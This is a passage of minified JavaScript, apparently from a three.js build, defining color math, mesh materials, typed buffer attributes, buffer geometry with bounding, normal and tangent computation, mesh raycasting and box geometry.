255*this.r<<16^255*this.g<<8^255*this.b<<0}},{key:"getHexString",value:function(){return("000000"+this.getHex().toString(16)).slice(-6)}},{key:"getHSL",value:function(e){var t,n,r=this.r,i=this.g,a=this.b,o=Math.max(r,i,a),s=Math.min(r,i,a),l=(s+o)/2;if(s===o)n=t=0;else{var c=o-s;switch(n=l<=.5?c/(o+s):c/(2-o-s),o){case r:t=(i-a)/c+(i<a?6:0);break;case i:t=(a-r)/c+2;break;case a:t=(r-i)/c+4}t/=6}return e.h=t,e.s=n,e.l=l,e}},{key:"getStyle",value:function(){return"rgb("+(255*this.r|0)+","+(255*this.g|0)+","+(255*this.b|0)+")"}},{key:"offsetHSL",value:function(e,t,n){return this.getHSL(Nt),Nt.h+=e,Nt.s+=t,Nt.l+=n,this.setHSL(Nt.h,Nt.s,Nt.l),this}},{key:"add",value:function(e){return this.r+=e.r,this.g+=e.g,this.b+=e.b,this}},{key:"addColors",value:function(e,t){return this.r=e.r+t.r,this.g=e.g+t.g,this.b=e.b+t.b,this}},{key:"addScalar",value:function(e){return this.r+=e,this.g+=e,this.b+=e,this}},{key:"sub",value:function(e){return this.r=Math.max(0,this.r-e.r),this.g=Math.max(0,this.g-e.g),this.b=Math.max(0,this.b-e.b),this}},{key:"multiply",value:function(e){return this.r*=e.r,this.g*=e.g,this.b*=e.b,this}},{key:"multiplyScalar",value:function(e){return this.r*=e,this.g*=e,this.b*=e,this}},{key:"lerp",value:function(e,t){return this.r+=(e.r-this.r)*t,this.g+=(e.g-this.g)*t,this.b+=(e.b-this.b)*t,this}},{key:"lerpColors",value:function(e,t,n){return this.r=e.r+(t.r-e.r)*n,this.g=e.g+(t.g-e.g)*n,this.b=e.b+(t.b-e.b)*n,this}},{key:"lerpHSL",value:function(e,t){this.getHSL(Nt),e.getHSL(Dt);var n=J(Nt.h,Dt.h,t),r=J(Nt.s,Dt.s,t),i=J(Nt.l,Dt.l,t);return this.setHSL(n,r,i),this}},{key:"equals",value:function(e){return e.r===this.r&&e.g===this.g&&e.b===this.b}},{key:"fromArray",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return this.r=e[t],this.g=e[t+1],this.b=e[t+2],this}},{key:"toArray",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return e[t]=this.r,e[t+1]=this.g,e[t+2]=this.b,e}},{key:"fromBufferAttribute",value:function(e,t){return this.r=e.getX(t),this.g=e.getY(t),this.b=e.getZ(t),!0===e.normalized&&(this.r/=255,this.g/=255,this.b/=255),this}},{key:"toJSON",value:function(){return this.getHex()}}]),e}();$t.NAMES=Ot,$t.prototype.isColor=!0,$t.prototype.r=1,$t.prototype.g=1,$t.prototype.b=1;var zt=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="MeshBasicMaterial",r.color=new $t(16777215),r.map=null,r.lightMap=null,r.lightMapIntensity=1,r.aoMap=null,r.aoMapIntensity=1,r.specularMap=null,r.alphaMap=null,r.envMap=null,r.combine=0,r.reflectivity=1,r.refractionRatio=.98,r.wireframe=!1,r.wireframeLinewidth=1,r.wireframeLinecap="round",r.wireframeLinejoin="round",r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this}}]),n}();zt.prototype.isMeshBasicMaterial=!0;var Ht=new ye,Vt=new re,Qt=function(){function e(t,n,r){if(_classCallCheck2(this,e),Array.isArray(t))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.name="",this.array=t,this.itemSize=n,this.count=void 0!==t?t.length/n:0,this.normalized=!0===r,this.usage=U,this.updateRange={offset:0,count:-1},this.version=0}return _createClass2(e,[{key:"onUploadCallback",value:function(){}},{key:"setUsage",value:function(e){return this.usage=e,this}},{key:"copy",value:function(e){return this.name=e.name,this.array=new e.array.constructor(e.array),this.itemSize=e.itemSize,this.count=e.count,this.normalized=e.normalized,this.usage=e.usage,this}},{key:"copyAt",value:function(e,t,n){e*=this.itemSize,n*=t.itemSize;for(var r=0,i=this.itemSize;r<i;r++)this.array[e+r]=t.array[n+r];return this}},{key:"copyArray",value:function(e){return this.array.set(e),this}},{key:"copyColorsArray",value:function(e){for(var t=this.array,n=0,r=0,i=e.length;r<i;r++){var a=e[r];void 0===a&&(a=new $t),t[n++]=a.r,t[n++]=a.g,t[n++]=a.b}return this}},{key:"copyVector2sArray",value:function(e){for(var t=this.array,n=0,r=0,i=e.length;r<i;r++){var a=e[r];void 0===a&&(a=new re),t[n++]=a.x,t[n++]=a.y}return this}},{key:"copyVector3sArray",value:function(e){for(var t=this.array,n=0,r=0,i=e.length;r<i;r++){var a=e[r];void 0===a&&(a=new ye),t[n++]=a.x,t[n++]=a.y,t[n++]=a.z}return this}},{key:"copyVector4sArray",value:function(e){for(var t=this.array,n=0,r=0,i=e.length;r<i;r++){var a=e[r];void 0===a&&(a=new fe),t[n++]=a.x,t[n++]=a.y,t[n++]=a.z,t[n++]=a.w}return this}},{key:"applyMatrix3",value:function(e){if(2===this.itemSize)for(var t=0,n=this.count;t<n;t++)Vt.fromBufferAttribute(this,t),Vt.applyMatrix3(e),this.setXY(t,Vt.x,Vt.y);else if(3===this.itemSize)for(var r=0,i=this.count;r<i;r++)Ht.fromBufferAttribute(this,r),Ht.applyMatrix3(e),this.setXYZ(r,Ht.x,Ht.y,Ht.z);return this}},{key:"applyMatrix4",value:function(e){for(var t=0,n=this.count;t<n;t++)Ht.x=this.getX(t),Ht.y=this.getY(t),Ht.z=this.getZ(t),Ht.applyMatrix4(e),this.setXYZ(t,Ht.x,Ht.y,Ht.z);return this}},{key:"applyNormalMatrix",value:function(e){for(var t=0,n=this.count;t<n;t++)Ht.x=this.getX(t),Ht.y=this.getY(t),Ht.z=this.getZ(t),Ht.applyNormalMatrix(e),this.setXYZ(t,Ht.x,Ht.y,Ht.z);return this}},{key:"transformDirection",value:function(e){for(var t=0,n=this.count;t<n;t++)Ht.x=this.getX(t),Ht.y=this.getY(t),Ht.z=this.getZ(t),Ht.transformDirection(e),this.setXYZ(t,Ht.x,Ht.y,Ht.z);return this}},{key:"set",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return this.array.set(e,t),this}},{key:"getX",value:function(e){return this.array[e*this.itemSize]}},{key:"setX",value:function(e,t){return this.array[e*this.itemSize]=t,this}},{key:"getY",value:function(e){return this.array[e*this.itemSize+1]}},{key:"setY",value:function(e,t){return this.array[e*this.itemSize+1]=t,this}},{key:"getZ",value:function(e){return this.array[e*this.itemSize+2]}},{key:"setZ",value:function(e,t){return this.array[e*this.itemSize+2]=t,this}},{key:"getW",value:function(e){return this.array[e*this.itemSize+3]}},{key:"setW",value:function(e,t){return this.array[e*this.itemSize+3]=t,this}},{key:"setXY",value:function(e,t,n){return e*=this.itemSize,this.array[e+0]=t,this.array[e+1]=n,this}},{key:"setXYZ",value:function(e,t,n,r){return e*=this.itemSize,this.array[e+0]=t,this.array[e+1]=n,this.array[e+2]=r,this}},{key:"setXYZW",value:function(e,t,n,r,i){return e*=this.itemSize,this.array[e+0]=t,this.array[e+1]=n,this.array[e+2]=r,this.array[e+3]=i,this}},{key:"onUpload",value:function(e){return this.onUploadCallback=e,this}},{key:"clone",value:function(){return new this.constructor(this.array,this.itemSize).copy(this)}},{key:"toJSON",value:function(){var e={itemSize:this.itemSize,type:this.array.constructor.name,array:Array.prototype.slice.call(this.array),normalized:this.normalized};return""!==this.name&&(e.name=this.name),this.usage!==U&&(e.usage=this.usage),0===this.updateRange.offset&&-1===this.updateRange.count||(e.updateRange=this.updateRange),e}},{key:"needsUpdate",set:function(e){!0===e&&this.version++}}]),e}();Qt.prototype.isBufferAttribute=!0;var Gt=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Int8Array(e),r,i)}return n}(),Wt=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Uint8Array(e),r,i)}return n}(),Kt=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Uint8ClampedArray(e),r,i)}return n}(),qt=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Int16Array(e),r,i)}return n}(),Xt=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Uint16Array(e),r,i)}return n}(),Yt=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Int32Array(e),r,i)}return n}(),Jt=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Uint32Array(e),r,i)}return n}(),Zt=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Uint16Array(e),r,i)}return n}();Zt.prototype.isFloat16BufferAttribute=!0;var en=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Float32Array(e),r,i)}return n}(),tn=function(e){_inherits2(n,Qt);var t=_createSuper(n);function n(e,r,i){return _classCallCheck2(this,n),t.call(this,new Float64Array(e),r,i)}return n}(),nn=0,rn=new Xe,an=new _t,on=new ye,sn=new we,ln=new we,cn=new ye,un=function(e){_inherits2(n,H);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),e=t.call(this),Object.defineProperty(_assertThisInitialized2(e),"id",{value:nn++}),e.uuid=q(),e.name="",e.type="BufferGeometry",e.index=null,e.attributes={},e.morphAttributes={},e.morphTargetsRelative=!1,e.groups=[],e.boundingBox=null,e.boundingSphere=null,e.drawRange={start:0,count:1/0},e.userData={},e}return _createClass2(n,[{key:"getIndex",value:function(){return this.index}},{key:"setIndex",value:function(e){return Array.isArray(e)?this.index=new(65535<ae(e)?Jt:Xt)(e,1):this.index=e,this}},{key:"getAttribute",value:function(e){return this.attributes[e]}},{key:"setAttribute",value:function(e,t){return this.attributes[e]=t,this}},{key:"deleteAttribute",value:function(e){return delete this.attributes[e],this}},{key:"hasAttribute",value:function(e){return void 0!==this.attributes[e]}},{key:"addGroup",value:function(e,t){var n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0;this.groups.push({start:e,count:t,materialIndex:n})}},{key:"clearGroups",value:function(){this.groups=[]}},{key:"setDrawRange",value:function(e,t){this.drawRange.start=e,this.drawRange.count=t}},{key:"applyMatrix4",value:function(e){var t=this.attributes.position;void 0!==t&&(t.applyMatrix4(e),t.needsUpdate=!0);var n=this.attributes.normal;if(void 0!==n){var r=(new ie).getNormalMatrix(e);n.applyNormalMatrix(r),n.needsUpdate=!0}var i=this.attributes.tangent;return void 0!==i&&(i.transformDirection(e),i.needsUpdate=!0),null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this}},{key:"applyQuaternion",value:function(e){return rn.makeRotationFromQuaternion(e),this.applyMatrix4(rn),this}},{key:"rotateX",value:function(e){return rn.makeRotationX(e),this.applyMatrix4(rn),this}},{key:"rotateY",value:function(e){return rn.makeRotationY(e),this.applyMatrix4(rn),this}},{key:"rotateZ",value:function(e){return rn.makeRotationZ(e),this.applyMatrix4(rn),this}},{key:"translate",value:function(e,t,n){return rn.makeTranslation(e,t,n),this.applyMatrix4(rn),this}},{key:"scale",value:function(e,t,n){return rn.makeScale(e,t,n),this.applyMatrix4(rn),this}},{key:"lookAt",value:function(e){return an.lookAt(e),an.updateMatrix(),this.applyMatrix4(an.matrix),this}},{key:"center",value:function(){return this.computeBoundingBox(),this.boundingBox.getCenter(on).negate(),this.translate(on.x,on.y,on.z),this}},{key:"setFromPoints",value:function(e){for(var t=[],n=0,r=e.length;n<r;n++){var i=e[n];t.push(i.x,i.y,i.z||0)}return this.setAttribute("position",new en(t,3)),this}},{key:"computeBoundingBox",value:function(){null===this.boundingBox&&(this.boundingBox=new we);var e=this.attributes.position,t=this.morphAttributes.position;if(e&&e.isGLBufferAttribute)this.boundingBox.set(new ye(-1/0,-1/0,-1/0),new ye(1/0,1/0,1/0));else{if(void 0!==e){if(this.boundingBox.setFromBufferAttribute(e),t)for(var n=0,r=t.length;n<r;n++){var i=t[n];sn.setFromBufferAttribute(i),this.morphTargetsRelative?(cn.addVectors(this.boundingBox.min,sn.min),this.boundingBox.expandByPoint(cn),cn.addVectors(this.boundingBox.max,sn.max),this.boundingBox.expandByPoint(cn)):(this.boundingBox.expandByPoint(sn.min),this.boundingBox.expandByPoint(sn.max))}}else this.boundingBox.makeEmpty();isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z)}}},{key:"computeBoundingSphere",value:function(){null===this.boundingSphere&&(this.boundingSphere=new $e);var e=this.attributes.position,t=this.morphAttributes.position;if(e&&e.isGLBufferAttribute)this.boundingSphere.set(new ye,1/0);else if(e){var n=this.boundingSphere.center;if(sn.setFromBufferAttribute(e),t)for(var r=0,i=t.length;r<i;r++){var a=t[r];ln.setFromBufferAttribute(a),this.morphTargetsRelative?(cn.addVectors(sn.min,ln.min),sn.expandByPoint(cn),cn.addVectors(sn.max,ln.max),sn.expandByPoint(cn)):(sn.expandByPoint(ln.min),sn.expandByPoint(ln.max))}sn.getCenter(n);for(var o=0,s=0,l=e.count;s<l;s++)cn.fromBufferAttribute(e,s),o=Math.max(o,n.distanceToSquared(cn));if(t)for(var c=0,u=t.length;c<u;c++)for(var d=t[c],p=this.morphTargetsRelative,h=0,f=d.count;h<f;h++)cn.fromBufferAttribute(d,h),p&&(on.fromBufferAttribute(e,h),cn.add(on)),o=Math.max(o,n.distanceToSquared(cn));this.boundingSphere.radius=Math.sqrt(o),isNaN(this.boundingSphere.radius)}}},{key:"computeTangents",value:function(){var e=this.index,t=this.attributes;if(null!==e&&void 0!==t.position&&void 0!==t.normal&&void 0!==t.uv){var n=e.array,r=t.position.array,i=t.normal.array,a=t.uv.array,o=r.length/3;void 0===t.tangent&&this.setAttribute("tangent",new Qt(new Float32Array(4*o),4));for(var s=t.tangent.array,l=[],c=[],u=0;u<o;u++)l[u]=new ye,c[u]=new ye;var d=new ye,p=new ye,h=new ye,f=new re,A=new re,m=new re,v=new ye,g=new ye,y=this.groups;0===y.length&&(y=[{start:0,count:n.length}]);for(var b=0,_=y.length;b<_;++b)for(var w=y[b],C=w.start,x=C,S=C+w.count;x<S;x+=3)N(n[x+0],n[x+1],n[x+2]);for(var k=new ye,M=new ye,B=new ye,E=new ye,T=0,P=y.length;T<P;++T)for(var I=y[T],F=I.start,L=F,O=F+I.count;L<O;L+=3)D(n[L+0]),D(n[L+1]),D(n[L+2])}function N(e,t,n){d.fromArray(r,3*e),p.fromArray(r,3*t),h.fromArray(r,3*n),f.fromArray(a,2*e),A.fromArray(a,2*t),m.fromArray(a,2*n),p.sub(d),h.sub(d),A.sub(f),m.sub(f);var i=1/(A.x*m.y-m.x*A.y);isFinite(i)&&(v.copy(p).multiplyScalar(m.y).addScaledVector(h,-A.y).multiplyScalar(i),g.copy(h).multiplyScalar(A.x).addScaledVector(p,-m.x).multiplyScalar(i),l[e].add(v),l[t].add(v),l[n].add(v),c[e].add(g),c[t].add(g),c[n].add(g))}function D(e){B.fromArray(i,3*e),E.copy(B);var t=l[e];k.copy(t),k.sub(B.multiplyScalar(B.dot(t))).normalize(),M.crossVectors(E,t);var n=M.dot(c[e])<0?-1:1;s[4*e]=k.x,s[4*e+1]=k.y,s[4*e+2]=k.z,s[4*e+3]=n}}},{key:"computeVertexNormals",value:function(){var e=this.index,t=this.getAttribute("position");if(void 0!==t){var n=this.getAttribute("normal");if(void 0===n)n=new Qt(new Float32Array(3*t.count),3),this.setAttribute("normal",n);else for(var r=0,i=n.count;r<i;r++)n.setXYZ(r,0,0,0);var a=new ye,o=new ye,s=new ye,l=new ye,c=new ye,u=new ye,d=new ye,p=new ye;if(e)for(var h=0,f=e.count;h<f;h+=3){var A=e.getX(h+0),m=e.getX(h+1),v=e.getX(h+2);a.fromBufferAttribute(t,A),o.fromBufferAttribute(t,m),s.fromBufferAttribute(t,v),d.subVectors(s,o),p.subVectors(a,o),d.cross(p),l.fromBufferAttribute(n,A),c.fromBufferAttribute(n,m),u.fromBufferAttribute(n,v),l.add(d),c.add(d),u.add(d),n.setXYZ(A,l.x,l.y,l.z),n.setXYZ(m,c.x,c.y,c.z),n.setXYZ(v,u.x,u.y,u.z)}else for(var g=0,y=t.count;g<y;g+=3)a.fromBufferAttribute(t,g+0),o.fromBufferAttribute(t,g+1),s.fromBufferAttribute(t,g+2),d.subVectors(s,o),p.subVectors(a,o),d.cross(p),n.setXYZ(g+0,d.x,d.y,d.z),n.setXYZ(g+1,d.x,d.y,d.z),n.setXYZ(g+2,d.x,d.y,d.z);this.normalizeNormals(),n.needsUpdate=!0}}},{key:"merge",value:function(e,t){if(e&&e.isBufferGeometry){void 0===t&&(t=0);var n=this.attributes;for(var r in n)if(void 0!==e.attributes[r])for(var i=n[r].array,a=e.attributes[r],o=a.array,s=a.itemSize*t,l=Math.min(o.length,i.length-s),c=0,u=s;c<l;c++,u++)i[u]=o[c];return this}}},{key:"normalizeNormals",value:function(){for(var e=this.attributes.normal,t=0,n=e.count;t<n;t++)cn.fromBufferAttribute(e,t),cn.normalize(),e.setXYZ(t,cn.x,cn.y,cn.z)}},{key:"toNonIndexed",value:function(){function e(e,t){for(var n=e.array,r=e.itemSize,i=e.normalized,a=new n.constructor(t.length*r),o=0,s=0,l=0,c=t.length;l<c;l++){o=e.isInterleavedBufferAttribute?t[l]*e.data.stride+e.offset:t[l]*r;for(var u=0;u<r;u++)a[s++]=n[o++]}return new Qt(a,r,i)}if(null===this.index)return this;var t=new n,r=this.index.array,i=this.attributes;for(var a in i){var o=e(i[a],r);t.setAttribute(a,o)}var s=this.morphAttributes;for(var l in s){for(var c=[],u=s[l],d=0,p=u.length;d<p;d++){var h=e(u[d],r);c.push(h)}t.morphAttributes[l]=c}t.morphTargetsRelative=this.morphTargetsRelative;for(var f=this.groups,A=0,m=f.length;A<m;A++){var v=f[A];t.addGroup(v.start,v.count,v.materialIndex)}return t}},{key:"toJSON",value:function(){var e={metadata:{version:4.5,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.type,""!==this.name&&(e.name=this.name),0<Object.keys(this.userData).length&&(e.userData=this.userData),void 0!==this.parameters){var t=this.parameters;for(var n in t)void 0!==t[n]&&(e[n]=t[n]);return e}e.data={attributes:{}};var r=this.index;null!==r&&(e.data.index={type:r.array.constructor.name,array:Array.prototype.slice.call(r.array)});var i=this.attributes;for(var a in i){var o=i[a];e.data.attributes[a]=o.toJSON(e.data)}var s={},l=!1;for(var c in this.morphAttributes){for(var u=this.morphAttributes[c],d=[],p=0,h=u.length;p<h;p++){var f=u[p];d.push(f.toJSON(e.data))}0<d.length&&(s[c]=d,l=!0)}l&&(e.data.morphAttributes=s,e.data.morphTargetsRelative=this.morphTargetsRelative);var A=this.groups;0<A.length&&(e.data.groups=JSON.parse(JSON.stringify(A)));var m=this.boundingSphere;return null!==m&&(e.data.boundingSphere={center:m.center.toArray(),radius:m.radius}),e}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"copy",value:function(e){this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null;var t={};this.name=e.name;var n=e.index;null!==n&&this.setIndex(n.clone(t));var r=e.attributes;for(var i in r){var a=r[i];this.setAttribute(i,a.clone(t))}var o=e.morphAttributes;for(var s in o){for(var l=[],c=o[s],u=0,d=c.length;u<d;u++)l.push(c[u].clone(t));this.morphAttributes[s]=l}this.morphTargetsRelative=e.morphTargetsRelative;for(var p=e.groups,h=0,f=p.length;h<f;h++){var A=p[h];this.addGroup(A.start,A.count,A.materialIndex)}var m=e.boundingBox;null!==m&&(this.boundingBox=m.clone());var v=e.boundingSphere;return null!==v&&(this.boundingSphere=v.clone()),this.drawRange.start=e.drawRange.start,this.drawRange.count=e.drawRange.count,this.userData=e.userData,void 0!==e.parameters&&(this.parameters=Object.assign({},e.parameters)),this}},{key:"dispose",value:function(){this.dispatchEvent({type:"dispose"})}}]),n}();un.prototype.isBufferGeometry=!0;var dn=new Xe,pn=new qe,hn=new $e,fn=new ye,An=new ye,mn=new ye,vn=new ye,gn=new ye,yn=new ye,bn=new ye,_n=new ye,wn=new ye,Cn=new re,xn=new re,Sn=new re,kn=new ye,Mn=new ye,Bn=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new un,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new zt;return _classCallCheck2(this,n),(e=t.call(this)).type="Mesh",e.geometry=r,e.material=i,e.updateMorphTargets(),e}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),void 0!==e.morphTargetInfluences&&(this.morphTargetInfluences=e.morphTargetInfluences.slice()),void 0!==e.morphTargetDictionary&&(this.morphTargetDictionary=Object.assign({},e.morphTargetDictionary)),this.material=e.material,this.geometry=e.geometry,this}},{key:"updateMorphTargets",value:function(){var e=this.geometry;if(e.isBufferGeometry){var t=e.morphAttributes,n=Object.keys(t);if(0<n.length){var r=t[n[0]];if(void 0!==r){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(var i=0,a=r.length;i<a;i++){var o=r[i].name||String(i);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=i}}}}else{var s=e.morphTargets;void 0!==s&&s.length}}},{key:"raycast",value:function(e,t){var n,r=this.geometry,i=this.material,a=this.matrixWorld;if(void 0!==i&&(null===r.boundingSphere&&r.computeBoundingSphere(),hn.copy(r.boundingSphere),hn.applyMatrix4(a),!1!==e.ray.intersectsSphere(hn)&&(dn.copy(a).invert(),pn.copy(e.ray).applyMatrix4(dn),null===r.boundingBox||!1!==pn.intersectsBox(r.boundingBox))))if(r.isBufferGeometry){var o=r.index,s=r.attributes.position,l=r.morphAttributes.position,c=r.morphTargetsRelative,u=r.attributes.uv,d=r.attributes.uv2,p=r.groups,h=r.drawRange;if(null!==o)if(Array.isArray(i))for(var f=0,A=p.length;f<A;f++)for(var m=p[f],v=i[m.materialIndex],g=Math.max(m.start,h.start),y=Math.min(o.count,Math.min(m.start+m.count,h.start+h.count));g<y;g+=3){var b=o.getX(g),_=o.getX(g+1),w=o.getX(g+2);(n=En(this,v,e,pn,s,l,c,u,d,b,_,w))&&(n.faceIndex=Math.floor(g/3),n.face.materialIndex=m.materialIndex,t.push(n))}else for(var C=Math.max(0,h.start),x=Math.min(o.count,h.start+h.count);C<x;C+=3){var S=o.getX(C),k=o.getX(C+1),M=o.getX(C+2);(n=En(this,i,e,pn,s,l,c,u,d,S,k,M))&&(n.faceIndex=Math.floor(C/3),t.push(n))}else if(void 0!==s)if(Array.isArray(i))for(var B=0,E=p.length;B<E;B++)for(var T=p[B],P=i[T.materialIndex],I=Math.max(T.start,h.start),F=Math.min(s.count,Math.min(T.start+T.count,h.start+h.count));I<F;I+=3)(n=En(this,P,e,pn,s,l,c,u,d,I,I+1,I+2))&&(n.faceIndex=Math.floor(I/3),n.face.materialIndex=T.materialIndex,t.push(n));else for(var L=Math.max(0,h.start),O=Math.min(s.count,h.start+h.count);L<O;L+=3)(n=En(this,i,e,pn,s,l,c,u,d,L,L+1,L+2))&&(n.faceIndex=Math.floor(L/3),t.push(n))}else r.isGeometry}}]),n}();function En(e,t,n,r,i,a,o,s,l,c,u,d){fn.fromBufferAttribute(i,c),An.fromBufferAttribute(i,u),mn.fromBufferAttribute(i,d);var p=e.morphTargetInfluences;if(a&&p){bn.set(0,0,0),_n.set(0,0,0),wn.set(0,0,0);for(var h=0,f=a.length;h<f;h++){var A=p[h],m=a[h];0!==A&&(vn.fromBufferAttribute(m,c),gn.fromBufferAttribute(m,u),yn.fromBufferAttribute(m,d),o?(bn.addScaledVector(vn,A),_n.addScaledVector(gn,A),wn.addScaledVector(yn,A)):(bn.addScaledVector(vn.sub(fn),A),_n.addScaledVector(gn.sub(An),A),wn.addScaledVector(yn.sub(mn),A)))}fn.add(bn),An.add(_n),mn.add(wn)}e.isSkinnedMesh&&(e.boneTransform(c,fn),e.boneTransform(u,An),e.boneTransform(d,mn));var v=function(e,t,n,r,i,a,o,s){if(null===(1===t.side?r.intersectTriangle(o,a,i,!0,s):r.intersectTriangle(i,a,o,2!==t.side,s)))return null;Mn.copy(s),Mn.applyMatrix4(e.matrixWorld);var l=n.ray.origin.distanceTo(Mn);return l<n.near||l>n.far?null:{distance:l,point:Mn.clone(),object:e}}(e,t,n,r,fn,An,mn,kn);if(v){s&&(Cn.fromBufferAttribute(s,c),xn.fromBufferAttribute(s,u),Sn.fromBufferAttribute(s,d),v.uv=It.getUV(kn,fn,An,mn,Cn,xn,Sn,new re)),l&&(Cn.fromBufferAttribute(l,c),xn.fromBufferAttribute(l,u),Sn.fromBufferAttribute(l,d),v.uv2=It.getUV(kn,fn,An,mn,Cn,xn,Sn,new re));var g={a:c,b:u,c:d,normal:new ye,materialIndex:0};It.getNormal(fn,An,mn,g.normal),v.face=g}return v}Bn.prototype.isMesh=!0;var Tn=function(e){_inherits2(n,un);var t=_createSuper(n);function n(){var e,r=0<arguments.length&&void 0!==arguments[0]?arguments[0]:1,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:1,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:1,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:1;_classCallCheck2(this,n),(e=t.call(this)).type="BoxGeometry",e.parameters={width:r,height:i,depth:a,widthSegments:o,heightSegments:s,depthSegments:l};var c=_assertThisInitialized2(e);o=Math.floor(o),s=Math.floor(s),l=Math.floor(l);var u=[],d=[],p=[],h=[],f=0,A=0;function m(e,t,n,r,i,a,o,s,l,m,v){for(var g=a/l,y=o/m,b=a/2,_=o/2,w=s/2,C=l+1,x=m+1,S=0,k=0,M=new ye,B=0;B<x;B++)for(var E=B*y-_,T=0;T<C;T++){var P=T*g-b;M[e]=P*r,M[t]=E*i,M[n]=w,d.push(M.x,M.y,M.z),M[e]=0,M[t]=0,M[n]=0<s?1:-1,p.push(M.x,M.y,M.z),h.push(T/l),h.push(1-B/m),S+=1}for(var I=0;I<m;I++)for(var F=0;F<l;F++){var L=f+F+C*I,O=f+F+C*(I+1),N=f+(F+1)+C*(I+1),D=f+(F+1)+C*I;u.push(L,O,D),u.push(O,N,D),k+=6}c.addGroup(A,k,v),A+=k,f+=S}return m("z","y","x",-1,-1,a,i,r,l,s,0),m("z","y","x",1,-1,a,i,-r,l,s,1),m("x","z","y",1,1,r,a,i,o,l,2),m("x","z","y",1,-1,r,a,-i,o,l,3),m("x","y","z",1,-1,r,i,a,o,s,4),m("x","y","z",-1,-1,r,i,-a,o,s,5),e.setIndex(u),e.setAttribute("position",new en(d,3)),e.setAttribute("normal",new en(p,3)),e.setAttribute("uv",new en(h,2)),e}return _createClass2(n,null,[{key:"fromJSON",value:function(e){return new n(e.width,e.height,e.depth,e.widthSegments,e.heightSegments,e.depthSegments)}}]),n}();function Pn(e){var t={};for(var n in e)for(var r in t[n]={},e[n]){var i=e[n][r];i&&(i.isColor||i.isMatrix3||i.isMatrix4||i.isVector2||i.isVector3||i.isVector4||i.isTexture||i.isQuaternion)?t[n][r]=i.clone():Array.isArray(i)?t[n][r]=i.slice():t[n][r]=i}return t}function In(e){for(var t={},n=0;n<e.length;n++){var r=Pn(e[n]);for(var i in r)t[i]=r[i]}return t}var Fn={clone:Pn,merge:In},Ln=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="ShaderMaterial",r.defines={},r.uniforms={},r.vertexShader="void main() {\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );\n}",r.fragmentShader="void main() {\n\tgl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );\n}",r.linewidth=1,r.wireframe=!1,r.wireframeLinewidth=1,r.fog=!1,r.lights=!1,r.clipping=!1,r.extensions={derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1},r.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv2:[0,0]},r.index0AttributeName=void 0,r.uniformsNeedUpdate=!1,r.glslVersion=null,void 0!==e&&(e.attributes,r.setValues(e)),r}return _createClass2(n,[{key:"copy",value:function(e){return 